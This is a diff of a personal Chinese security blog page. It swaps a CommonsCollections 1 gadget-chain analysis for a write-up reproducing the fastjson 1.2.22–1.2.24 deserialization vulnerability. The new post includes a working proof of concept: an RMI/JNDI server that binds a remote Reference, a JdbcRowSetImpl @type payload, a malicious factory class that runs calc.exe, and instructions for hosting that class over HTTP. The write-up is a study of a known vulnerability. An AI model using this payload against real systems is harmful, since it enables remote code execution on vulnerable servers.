@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">CommonsCollections 1分析 | xiaotan&#39;s blog</title>
+  <title itemprop="name">fastjson1.2.22-1.2.24漏洞复现与分析 | xiaotan&#39;s blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -378,15 +378,15 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://tva1.sinaimg.cn/large/008eGmZEly1gob65p779xj31hc0u01jr.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1gob65p779xj31hc0u01jr.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      CommonsCollections 1分析</h1>
+      fastjson1.2.22-1.2.24漏洞复现与分析</h1>
       <p class="entry-census">
         <span>
           <a href="york145.github.io/">
-            <img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg">
+            <img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob65p779xj31hc0u01jr.jpg">
           </a>
         </span>
         <span>
@@ -394,7 +394,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-3-3<span class="bull">
+        2021-3-7<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -408,157 +408,219 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="CommonsCollections-1分析"><a href="#CommonsCollections-1分析" class="headerlink" title="CommonsCollections 1分析"></a>CommonsCollections 1分析</h1><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre><code>ObjectInputStream.readObject()
-        AnnotationInvocationHandler.readObject()
-            Map(Proxy).entrySet()
-                AnnotationInvocationHandler.invoke()
-                    LazyMap.get()
-                        ChainedTransformer.transform()
-                            ConstantTransformer.transform()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Class.getMethod()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.getRuntime()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.exec()</code></pre><p>在CC1的利用中使用的是LazyMap，而在LazyMap中需要用到动态代理。</p>
-<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>官方文档</p>
-<h3 id="InvocationHandler"><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h3><pre><code>public interface InvocationHandler</code></pre><p>InvocationHandler是由代理实例的调用处理程序实现的接口 。<br>每个代理实例都有一个关联的调用处理程序。 当在代理实例上调用方法时，方法调用将被编码并分派到其调用处理程序的invoke方法。</p>
-<table>
-<thead>
-<tr>
-<th align="left">Modifier and Type</th>
-<th align="left">Method and Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Object</td>
-<td align="left">invoke(Object proxy, 方法 method, Object[] args)处理代理实例上的方法调用并返回结果。</td>
-</tr>
-<tr>
-<td align="left">### Proxy</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">public class Proxy</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">extends Object</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">implements Serializable</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">Proxy提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">为某个接口创建代理Foo ：</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<pre><code>  InvocationHandler handler = new MyInvocationHandler(...);
-     Class&lt;?&gt; proxyClass = Proxy.getProxyClass(Foo.class.getClassLoader(), Foo.class);
-     Foo f = (Foo) proxyClass.getConstructor(InvocationHandler.class).
-                 newInstance(handler); 
-或更简单地：
-  Foo f = (Foo) Proxy.newProxyInstance(Foo.class.getClassLoader(),
-                                      new Class&lt;?&gt;[] &#123; Foo.class &#125;,
-                                      handler); </code></pre><ul>
-<li>每个代理类有一个公共构造一个参数，该接口的实现InvocationHandler ，设置调用处理程序的代理实例。 而不必使用反射API来访问公共构造函数，也可以通过调用Proxy.newProxyInstance方法来创建代理实例，该方法将调用Proxy.getProxyClass的操作与调用处理程序一起调用构造函数。</li>
+          <h1 id="基于Java反序列化-初识RMI，JRMP，JNDI"><a href="#基于Java反序列化-初识RMI，JRMP，JNDI" class="headerlink" title="基于Java反序列化-初识RMI，JRMP，JNDI"></a>基于Java反序列化-初识RMI，JRMP，JNDI</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>QAQ，感觉自己啥也不会，要好好努力学习了。但是由于本人遗忘度很大，因此要记下来学习QAQ。</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="RMI（Remote-Method-Invocation）"><a href="#RMI（Remote-Method-Invocation）" class="headerlink" title="RMI（Remote Method Invocation）"></a>RMI（Remote Method Invocation）</h3><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p>
+<p>Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。</p>
+<p>乱七八糟的一大串，简单来说，RMI就是一个只java远程调用方法的行为。</p>
+<h3 id="JRMP（Java-Remote-Method-Protocol）"><a href="#JRMP（Java-Remote-Method-Protocol）" class="headerlink" title="JRMP（Java Remote Method Protocol）"></a>JRMP（Java Remote Method Protocol）</h3><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。<br>###JNDI（Java Naming and Directory Interface）<br>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+<p>就是一个接口，可以通过lookup方法访问其所绑定的对象。</p>
+<h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><h5 id="程序A"><a href="#程序A" class="headerlink" title="程序A"></a>程序A</h5><p>继承Remote的HelloService接口：</p>
+<pre><code>public interface HelloService extends Remote &#123;
+    String sayHello() throws RemoteException;
+&#125;</code></pre><p>HelloService的实现</p>
+<pre><code>public class HelloServiceImpl extends UnicastRemoteObject implements HelloService &#123;
+    public HelloServiceImpl() throws RemoteException &#123;
+    &#125;
+
+    @Override
+    public String sayHello() throws RemoteException &#123;
+        System.out.println(&quot;hello!&quot;);
+        return &quot;hello!&quot;;
+    &#125;
+&#125;</code></pre><p>RMI服务端</p>
+<pre><code>public class RMIServer &#123;
+    public static void main(String[] args) &#123;
+        try &#123;
+            Registry registry = LocateRegistry.createRegistry(1099);
+            registry.bind(&quot;hello&quot;, new HelloServiceImpl());
+        &#125; catch (RemoteException e) &#123;
+            e.printStackTrace();
+        &#125; catch (AlreadyBoundException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre><h4 id="程序B"><a href="#程序B" class="headerlink" title="程序B"></a>程序B</h4><pre><code>public class RMIClient &#123;
+    public static void main(String[] args) &#123;
+        try &#123;
+            HelloService helloService = (HelloService)LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099).lookup(&quot;hello&quot;);
+        System.out.println(helloService.sayHello());
+        &#125; catch (RemoteException e) &#123;
+            e.printStackTrace();
+        &#125; catch (NotBoundException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre><p>先执行程序A再执行程序B就会打印hello。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go8nwk0h35j324o0d8wg3.jpg" alt=""><br>程序A启动了一个RMI的注册中心，并把HelloServiceImpl暴露在注册中心中。程序B启动之后通过命名寻找方法，最后通过JRMP协议发起RMI请求，程序A输出hello后将信息序列化发送给程序B，最后程序B反序列化输出。</p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化有三个函数：</p>
+<pre><code>parse (String text) 
+parseObject(String text)
+parseObject(String text, Class clazz)</code></pre><pre><code class="java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+
+import java.util.Properties;
+
+public class fastjsonTest &#123;
+    public String t1;
+    private int t2;
+    private Boolean t3;
+    private Properties t4;
+    private Properties t5;
+
+    public String getT1() &#123;
+        System.out.println(&quot;getT1()&quot;);
+        return t1;
+    &#125;
+
+    public void setT1(String t1) &#123;
+        this.t1 = t1;
+        System.out.println(&quot;setT1()&quot;);
+    &#125;
+
+    public int getT2() &#123;
+        System.out.println(&quot;getT2&quot;);
+        return t2;
+    &#125;
+
+    public void setT2(int t2) &#123;
+        System.out.println(&quot;setT2&quot;);
+        this.t2 = t2;
+    &#125;
+
+    public Boolean getT3() &#123;
+        System.out.println(&quot;getT3&quot;);
+        return t3;
+    &#125;
+
+
+    public Properties getT4() &#123;
+        System.out.println(&quot;getT4&quot;);
+        return t4;
+    &#125;
+
+
+
+    public Properties getT5() &#123;
+        System.out.println(&quot;getT5&quot;);
+        return t5;
+    &#125;
+
+    public void setT5(Properties t5) &#123;
+        System.out.println(&quot;setT5&quot;);
+        this.t5 = t5;
+    &#125;
+
+    @Override
+    public String toString() &#123;
+        return &quot;fastjsonTest&#123;&quot; +
+                &quot;t1=&#39;&quot; + t1 + &#39;\&#39;&#39; +
+                &quot;, t2=&quot; + t2 +
+                &quot;, t3=&quot; + t3 +
+                &quot;, t4=&quot; + t4 +
+                &quot;, t5=&quot; + t5 +
+                &#39;&#125;&#39;;
+    &#125;
+
+    public static void main(String[] args) &#123;
+        String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;fastjsonTest\&quot;,\&quot;t1\&quot;:1,\&quot;t2\&quot;:2,\&quot;t3\&quot;:3,\&quot;t4\&quot;:&#123;&#125;,\&quot;t5\&quot;:&#123;&#125;&#125;&quot;;
+        Object obj = JSON.parse(jsonstr);
+//        Object obj = JSON.parseObject(jsonstr,fastjsonTest.class);
+//        Object obj = JSON.parseObject(jsonstr);
+        System.out.println(obj);
+    &#125;
+&#125;
+</code></pre>
+<h4 id="Json-parse-jsonstr"><a href="#Json-parse-jsonstr" class="headerlink" title="Json.parse(jsonstr)"></a>Json.parse(jsonstr)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xgtancaj316w0e2myz.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xlnso5cj318s08mn1g.jpg" alt=""><br>setT1() 、setT2() 、getT4() 、setT5() 被调用</p>
+<p>JSON.parse(jsonstr)最终返回FastJsonTest类的对象</p>
+<h4 id="JSON-parseObject-jsonstr-fastjsonTest-class"><a href="#JSON-parseObject-jsonstr-fastjsonTest-class" class="headerlink" title="JSON.parseObject(jsonstr,fastjsonTest.class)"></a>JSON.parseObject(jsonstr,fastjsonTest.class)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xs4d6ydj316c0u0te7.jpg" alt=""></p>
+<p>可以看见parseObject(jsonstr,fastjsonTest.class)的输出和parse一样，并且obj的类也相同。</p>
+<h4 id="JSON-parseObject-jsonstr"><a href="#JSON-parseObject-jsonstr" class="headerlink" title="JSON.parseObject(jsonstr)"></a>JSON.parseObject(jsonstr)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xyxpgctj31f40u0wle.jpg" alt=""></p>
+<p>FastJsonTest类中的所有getter与setter都被调用了，并且JSON.parseObject(jsonstr);返回一个JSONObject对象而且其中的getT4还被调用了两次，这究竟是为什么呢？</p>
+<p>我们先来总结一下：</p>
+<ul>
+<li>parse(String text)，构造方法 + setter + 满足条件额外的getter</li>
+<li>parseObject(String text, Class<T> clazz) ，构造方法 + setter + 满足条件额外的getter</li>
+<li>JSONObject parseObject(String text)，构造方法 + setter + getter + 满足条件额外的getter</li>
 </ul>
-<p>这里来举个例子：<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go5jfrbooyj21c00u07fu.jpg" alt=""><br>这里先定义一个handler实现对接口的调用。</p>
-<p>然后再创建一个hello对象，因为所有方法都会委派给invoke，而重写的invoke方法中当使用get方法时会打印Evil。最后在输出中打印Evil。</p>
-<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在commons collections中有一个Transformer接口，其中包含一个Transfrome方法，我们可以通过此接口来完成cc1的利用。</p>
-<p>在众多的继承中，我们主要利用到三个</p>
-<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><pre><code>public InvokerTransformer(String methodName,
-              Class[] paramTypes,
-              Object[] args)
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>分析这里讲得很清楚了，就不复述了。<a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></p>
+<h2 id="JdbcRowsetlmpl"><a href="#JdbcRowsetlmpl" class="headerlink" title="JdbcRowsetlmpl"></a>JdbcRowsetlmpl</h2><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><p>因为过程中出现了bug，导致不能远程调用class文件，导致我学了一天才搞懂，虽然过程很自闭，但是还好最后解决了。我们先写一个JNDIserver的代码：</p>
+<pre><code class="java">import com.sun.jndi.rmi.registry.ReferenceWrapper;
 
-Constructor that performs no validation. Use getInstance if you want that.
-Parameters:
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
 
-methodName - the method to call
-paramTypes - the constructor parameter types, not cloned
-args - the constructor arguments, not cloned
+public class JNDIServer &#123;
+    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, AlreadyBoundException, RemoteException &#123;
+        Registry registry = LocateRegistry.createRegistry(1099);
+        System.out.println(&quot;Java RMI created!port:1099&quot;);
+        Reference reference = new Reference(&quot;exploit&quot;, &quot;badClassName&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        registry.bind(&quot;exploit&quot;,referenceWrapper);
+    &#125;
+&#125;</code></pre>
+<h4 id="JNDIClient"><a href="#JNDIClient" class="headerlink" title="JNDIClient"></a>JNDIClient</h4><pre><code class="java">import com.alibaba.fastjson.JSON;
 
-Transforms the input to result by invoking a method on the input.</code></pre><p>这个方法对input进行反射。</p>
-<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>其Transformer将输入原封不动的返回。</p>
-<pre><code>public Object transform(Object input)
-Transforms the input by ignoring it and returning the stored constant instead.
+public class JNDIClient &#123;
+    public static void main(String[] args) &#123;
+        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;
+        JSON.parse(PoC);
+    &#125;
+&#125;</code></pre>
+<h4 id="badClassName"><a href="#badClassName" class="headerlink" title="badClassName"></a>badClassName</h4><pre><code class="java">import java.io.IOException;
+import java.io.Serializable;
+import java.util.Hashtable;
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
 
-Specified by:
-transform in interface Transformer
-Parameters:
-input - the input object which is ignored
-Returns:
-the stored constant</code></pre><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6t2i0cudj20z80883zh.jpg" alt=""></p>
-<p>这三个组合起来就可以实现任意执行</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6ucwghpfj20vz0ek0ua.jpg" alt=""><br>这样就可以弹出计算器了，但是这里反序列化的时候会发生报错。因为Runtime并没有继承Serializable，所以这里会序列化失败。刚刚开始我还傻傻的以为这是不能命令执行，结果我发现我的可以执行（小丑竟是我自己）。</p>
-<p>因此我们要用反射的方式来调用getRuntime这个方法。</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6vz5c6u9j216e0lyaew.jpg" alt=""></p>
-<p>接下来我们就要思考中cc1中哪里触发了transform方法，这里是LazyMap中的get方法触发</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6wbq1kvjj20ws0awabf.jpg" alt=""></p>
-<p>可以看见当get的键不存在时，会触发transform方法。</p>
-<pre><code>protected final Transformer factory;</code></pre><p>而且这里的factory也是可控的。现在我们找到了transform的触发点LazyMap#get，因此我们接下来应该找到readObject的触发点了。下面便要用到我们开头讲过的动态代理了，在AnnotationInvocationHandler中有使用到readObject方法。</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6yxmvliaj213o0dcwt4.jpg" alt=""></p>
-<p>那么我们就让这里的memberValues为代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。</p>
-<p>因为代理类调用方法会触发invoke方法，而invoke方法中又使用到了get方法(在下面代码的最后一行)，所以我们只要设置两个代理就可以触发。</p>
-<pre><code>class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;
+public class badClassName implements ObjectFactory, Serializable &#123;
+    public badClassName() &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        &#125; catch (IOException var2) &#123;
+            var2.printStackTrace();
+        &#125;
 
-    private final Class&lt;? extends Annotation&gt; type;
-    private final Map&lt;String, Object&gt; memberValues;
-    private transient volatile Method[] memberMethods = null;
+    &#125;
 
-    /* 后续无关代码就省略了，想看的话可以查看 sun/reflect/annotation/AnnotationInvocationHandler */
-   &#125;
+    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4) throws Exception &#123;
+        return null;
+    &#125;
 
-public Object invoke(Object var1, Method var2, Object[] var3) &#123;
-        String var4 = var2.getName();
-        Class[] var5 = var2.getParameterTypes();
-        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;
-            return this.equalsImpl(var3[0]);
-        &#125; else if (var5.length != 0) &#123;
-            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
-        &#125; else &#123;
-            byte var7 = -1;
-            switch(var4.hashCode()) &#123;
-            case -1776922004:
-                if (var4.equals(&quot;toString&quot;)) &#123;
-                       var7 = 0;
-                &#125;
-                break;
-            case 147696667:
-                if (var4.equals(&quot;hashCode&quot;)) &#123;
-                    var7 = 1;
-                &#125;
-                break;
-            case 1444986633:
-                if (var4.equals(&quot;annotationType&quot;)) &#123;
-                    var7 = 2;
-                &#125;
-            &#125;
-
-            switch(var7) &#123;
-            case 0:
-                return this.toStringImpl();
-            case 1:
-                return this.hashCodeImpl();
-            case 2:
-                return this.type;
-            default:
-                Object var6 = this.memberValues.get(var4);</code></pre><p>我这运行最终poc中遇到了如下的bug：</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6yq5c5jaj20vs06xmyl.jpg" alt=""><br>这是因为java版本过高导致的，这里的版本应该是1.7.</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6yuyzvpmj212j06uwfy.jpg" alt=""></p>
-<p>最终也成功的弹出了计算器。这里设置了两个代理有点绕，第一个代理是用来触发代理类中的get的，第二个代理是来触发invoke的。</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go6zbx4oimj20ve0giwig.jpg" alt=""></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.wjlshare.xyz/archives/1502">https://www.wjlshare.xyz/archives/1502</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a></p>
+    public static void main(String[] var0) &#123;
+        new badClassName();
+    &#125;
+&#125;</code></pre>
+<p>部署过程先运行JNIDServer然后再编译badClassName生成class文件，利用python启动HTTP服务，最后再启动JNDIClient便可以弹出计算器。<br>    python3 -m http.server 8000(这里不写端口号默认为8000)<br>这里如果想要成功复现的话需要如下环境：</p>
+<ul>
+<li>fastjson1.2.22-1.2.24</li>
+<li>JDK&lt;=6u141、7u131、8u121.</li>
+<li>在一些java8的版本也可以添加JVM参数-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</li>
+</ul>
+<p>如果运行完成功弹出计算器，记得看一下http是否被访问，只有被访问，才算成功的复现，如果没访问就弹出计算器是因为在本地加载了class文件。当时为就是一直卡在这里，由于m1的适配问题，为换了一台电脑，但是又因为为Windows的环境问题有一些小bug，不过还好最终解决了。</p>
+<h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>我们先逆向的分析，这样个人认为比较容易明白。<br>我们通过对JDNI注入的学习，应该知道JNDI注入是因为lookup的调用，那我们要思考中JdbcRowsetlmpl中哪里触发了lookup函数。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4v1hzbsj31fx0qe798.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4yvzb48j316s0nxdjm.jpg" alt=""><br>在JdbcRowSetlmpl函数中调用到lookup函数的是connect函数，我们看见lookup的参数是getDataSourceName返回的函数。我们上面总结过中parse中，会调用所有的setter函数，因此datasource是可控的。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob503ywbej30kn05mt92.jpg" alt=""><br>在setAutoCommit中调用了connect。因此POC遍显而易见了</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://localhost:1099/exploit&quot;, &quot;autoCommit&quot;:false&#125;</code></pre><p>这里先总结一下后面的调用链：</p>
+<pre><code>Lookup:417,InitalContext //jndi lookup函数通过rmi或者ldap获取恶意类
+connect：624，JdbcRowSetlmpl。//通过connect触发lookup
+setAutoCommit:4067,JdbcRowSetImpl //通过setAutoCommit从而在后面触发了connect函数</code></pre><p>我们再转回去看看</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4pcbxrlj30kh04gq35.jpg" alt=""><br>从parse进入，刚开始会调用DefaultJSONParser，这个函数会将token设置为12.<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4rukux4j30qk08v0tl.jpg" alt=""><br>然后我们跟进DefaultJSONParser.parser函数中，</p>
+<p>在上面我们说过token被设置为12，因此在这里会跳转到这个位置，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob592xkcxj30rj0bgabp.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5buoytyj30v1054jsb.jpg" alt=""><br>这里获取key值与@type做对比，然后获取class值。继续跟踪<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5dz5cyrj317l0530tf.jpg" alt=""><br>这里调用了getDeserializer生成该类型的反序列化器，但是这里利用了ASM机制动态生成类，但是此类的Java源文件没有，无法进行调试，按照之前的逻辑，在FastjsonASMDeserializer_1_JdbcRowSetImpl中会获取到属性的key值，并通过DefaultFieldDeserializer.parseField方法反序列化属性。<br>我们进入到deserialize中。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5kk9cqbj318h05pdgi.jpg" alt=""><br>这里将autoCommit作为key值传入。最后通过setValue触发invoke。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5q1xwa1j30g802wwed.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5q8g06cj30ms02oq2y.jpg" alt=""><br>后面就是后半段链了。<br>下面是利用链：</p>
+<pre><code>parse#fastjson
+  paserObject#fastjson
+   deserialze#JavaBeanDeserializer
+    parseField#DefaultFieldDeserialzer
+      setValue#fieldDeserializer
+    invoke#Method
+      serAutoCommit#JabcRowSetlmpl
+       connect#JdbcRowSetlmpl
+             lookup</code></pre><p>还有一个利用链事LADP+RMI原理差不多，就不写了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>也不知道自己理解的有没有问题，哎，终究是太菜，觉得大佬们都好强。还是要继续努力QAQ。这个月买了想了半个年的macbookpro m1但是也发生了让我很伤心的事。</p>
+<p>你总以为，未来路很长，有无限的可能。却不知道，有些人有些物等不了你。世间好物不坚牢，彩云易散琉璃脆。你只有见过死亡，才能体会生活的真相。</p>
+<p>人生如逆旅，你我皆行人，擦肩而过，就是永远。</p>
 
         </div>
         <!-- .entry-content -->
@@ -587,36 +649,19 @@ public Object invoke(Object var1, Method var2, Object[] var3) &#123;
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/03/07/fastjson1.2.22-1.2.24%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1gob65p779xj31hc0u01jr.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://tva1.sinaimg.cn/large/008eGmZEly1gob65p779xj31hc0u01jr.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                fastjson1.2.22-1.2.24漏洞复现与分析</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/03/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7/" rel="next">
+            <a href="/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1go5bvx6zc3j21hc0u0dp2.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://tva1.sinaimg.cn/large/e6c9d24egy1go5bvx6zc3j21hc0u0dp2.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                静态分析技巧</h3>
+                CommonsCollections 1分析</h3>
                 <hr>
               </div>
             </a>
@@ -640,7 +685,7 @@ public Object invoke(Object var1, Method var2, Object[] var3) &#123;
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="york145.github.io/" class="profile gravatar"><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg" itemprop="image" alt="xiaotan" height="70" width="70"></a>
+          <a href="york145.github.io/" class="profile gravatar"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob65p779xj31hc0u01jr.jpg" itemprop="image" alt="xiaotan" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
@@ -649,7 +694,7 @@ public Object invoke(Object var1, Method var2, Object[] var3) &#123;
           </div>
         </div>
         <hr>
-        <p><i class="iconfont icon-write"></i>一个超菜的人</p>
+        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
       </section>
     </main><!-- #main -->
   </div><!-- #primary -->
